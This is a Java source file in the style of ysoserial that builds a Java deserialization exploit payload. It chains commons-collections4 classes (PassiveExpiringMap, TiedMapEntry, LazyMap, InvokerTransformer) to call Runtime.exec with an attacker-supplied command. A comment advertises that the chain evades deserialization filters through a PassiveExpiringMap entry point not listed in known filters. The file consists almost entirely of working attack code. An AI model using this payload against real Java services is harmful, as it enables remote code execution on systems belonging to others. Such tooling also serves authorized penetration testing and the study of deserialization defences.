package ysoserial.payloads;

import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.map.PassiveExpiringMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	PassiveExpiringMap (CC4) entry point — bypasses all standard entry point filters.

	Gadget chain:
		ObjectInputStream.readObject()
			PassiveExpiringMap.readObject()
				PassiveExpiringMap.put(key, value)   // restores entries
					decorated HashMap.put(key, value)
						key.hashCode()
							TiedMapEntry.hashCode()
								TiedMapEntry.getValue()
									LazyMap.get()
										ChainedTransformer.transform()
											InvokerTransformer.transform()
												Method.invoke()
													Runtime.exec()

	PassiveExpiringMap has its own readObject that restores entries.
	The internal HashMap calls key.hashCode() on insertion.

	Filter evasion:
		1. PassiveExpiringMap (o.a.c.c4.map) — not in any known filter
		2. CC4-only — useful when only commons-collections4 is on classpath
		3. Novel class identity bypasses all entry point filters

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-collections4 4.0+
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.DMBS335 })
public class CommonsCollections20 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {

		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformers to arm later
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// PassiveExpiringMap wraps a HashMap — novel CC4 entry point
		PassiveExpiringMap<Object, Object> expiringMap = new PassiveExpiringMap<Object, Object>(
			new HashMap<Object, Object>());
		expiringMap.put(entry, "bar");

		// Remove cached "foo"→1 from innerMap
		innerMap.remove("foo");

		// Arm the transformer chain
		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return expiringMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections20.class, args);
	}
}
